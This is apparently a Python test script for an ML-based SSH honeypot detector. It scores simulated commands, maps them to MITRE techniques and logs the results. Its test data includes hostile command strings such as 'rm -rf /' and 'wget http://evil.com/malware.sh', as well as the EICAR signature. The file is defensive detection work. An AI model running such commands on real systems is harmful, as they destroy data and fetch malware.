#!/usr/bin/env python3
import sys
import json
import time
from pathlib import Path

# Add project root to path
sys.path.append(str(Path(__file__).resolve().parent.parent / "src"))
sys.path.append(str(Path.cwd() / "src"))

from cyanide.ml.cyanideML.model import HoneypotFilter
from cyanide.ml.cyanideML.knowledge_base import KnowledgeBase

def verify_logging():
    print("[*] Starting Full ML & KB Verification...")
    
    # 1. Load Configuration & Models
    ml_log_path = Path("var/log/cyanide/cyanideML-log.json")
    print(f"[*] Target Log File: {ml_log_path}")
    
    try:
        print("[*] Loading Anomaly Detector (Autoencoder)...")
        model = HoneypotFilter.load("ai_models/cyanideML/cyanideML.pkl")
        # FORCE THRESHOLD LOWER FOR DEMONSTRATION
        # The default 0.5 is for cold start safety. Real anomalies are ~0.005 vs 0.002.
        model.threshold = 0.004 
        print(f"[*] Model loaded. Threshold adjusted to {model.threshold:.4f} for sensitivity demo.")

        print("[*] Loading Knowledge Base (TF-IDF)...")
        kb = KnowledgeBase()
        kb.load("ai_models/cyanideML/knowledge_base.pkl")
        print("[*] Knowledge Base loaded.")
        
    except Exception as e:
        print(f"[!] Failed to load models: {e}")
        return

    # 2. Simulate Attacks
    test_cases = [
        {"cmd": "ls -la", "expected": "clean", "desc": "Normal User Command"},
        {"cmd": "echo 'hello world'", "expected": "clean", "desc": "Normal User Command"},
        {"cmd": "rm -rf /", "expected": "clean", "desc": "Common Attack (Known Pattern)"},
        {"cmd": "wget http://evil.com/malware.sh", "expected": "clean", "desc": "Common Attack (Known Pattern)"},
        # MITRE-linked commands
        {"cmd": "netstat -antp", "expected": "anomaly", "desc": "Network Discovery (T1049)"},
        {"cmd": "crontab -l", "expected": "anomaly", "desc": "Persistence via Cron (T1053.003)"},
        {"cmd": "sudo -l", "expected": "anomaly", "desc": "Sudo Discovery (T1169)"},
        {"cmd": "systemctl status", "expected": "anomaly", "desc": "Service Discovery (T1501)"},
        # Tactic mapping tests
        {"cmd": "search for victim servers", "expected": "anomaly", "desc": "Reconnaissance (TA0043)"},
        {"cmd": "buy cloud infrastructure", "expected": "anomaly", "desc": "Resource Development (TA0042)"},
        {"cmd": "exploit web server", "expected": "anomaly", "desc": "Initial Access (TA0001)"},
        {"cmd": "reconnaissance", "expected": "anomaly", "desc": "Tactic Search (TA0043)"},
        # Novel / Obfuscated / Gibberish
        {"cmd": "dskjfh skdjf hskd jfh skdjf h", "expected": "anomaly", "desc": "Gibberish Input"},
        {"cmd": "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR", "expected": "anomaly", "desc": "EICAR Signature"},
    ]
    
    print("\n--- Processing Test Cases ---")
    print(f"{'COMMAND':<40} | {'VERDICT':<10} | {'SCORE':<8} | {'KB ANALYSIS'}")
    print("-" * 120)

    # Ensure log directory exists
    ml_log_path.parent.mkdir(parents=True, exist_ok=True)
    
    initial_log_size = 0
    if ml_log_path.exists():
        with open(ml_log_path, "r") as f:
            initial_log_size = len(f.readlines())
            
    for case in test_cases:
        cmd = case["cmd"]
        
        # Construct log entry
        log_entry = {
            "timestamp": time.time(),
            "command": cmd,
            "username": "root",
            "src_ip": "192.168.1.100",
            "dst_port": 22,
            "protocol": "ssh"
        }
        
        # 1. ML Detection
        is_anomaly, reason, distance = model.process_log(log_entry)
        verdict = "ANOMALY" if is_anomaly else "Clean"
        
        # 2. KB Correlation (if anomaly or suspicious)
        kb_result = "N/A"
        # We query KB for robust attacks even if model thinks it's "known" (it matches training data)
        # But for this demo, let's query if it's an attack-like command
        if is_anomaly or "evil" in cmd or "rm -rf" in cmd or "python" in cmd:
             search_res = kb.search(cmd)
             if search_res:
                 # search_res is now a list of matches: [{'source': '...', 'content': '...', 'raw': ...}, ...]
                 parts = []
                 for match in search_res:
                     source = match.get('source', 'Unknown')
                     if source == "MITRE":
                         mid = match.get('id', 'N/A')
                         mname = match.get('name', 'Unknown')
                         mdesc = match.get('description', '').replace('\n', ' ')
                         # Exact format requested: ID \t Name \t Description
                         parts.append(f"{mid}\t{mname}\t{mdesc}")
                     else:
                         content = match.get('content', '')[:50].replace('\n', ' ') + "..."
                         parts.append(f"[{source}] {content}")
                 kb_result = " | ".join(parts)
             else:
                 kb_result = "No Match"

        # Output Table Row
        cmd_display = (cmd[:37] + '...') if len(cmd) > 37 else cmd
        print(f"{cmd_display:<40} | {verdict:<10} | {distance:.4f}   | {kb_result}")
        
        # Simulate Logging
        import datetime
        log_data = {
            "timestamp": datetime.datetime.now().isoformat(),
            "src_ip": "192.168.1.100",
            "session_id": f"test-{int(time.time())}",
            "verdict": verdict,
            "reason": reason,
            "distance": float(distance),
            "command": cmd,
            "kb_display": kb_result if kb_result != "N/A" else None,
            "is_test": True 
        }
        
        with open(ml_log_path, "a") as f:
            f.write(json.dumps(log_data) + "\n")
            
    print("\n[+] Logging complete.")
    
    # 3. Verify Log File
    with open(ml_log_path, "r") as f:
        lines = f.readlines()
        new_lines = len(lines) - initial_log_size
        print(f"[*] Log file grew by {new_lines} lines.")

if __name__ == "__main__":
    verify_logging()

if __name__ == "__main__":
    verify_logging()
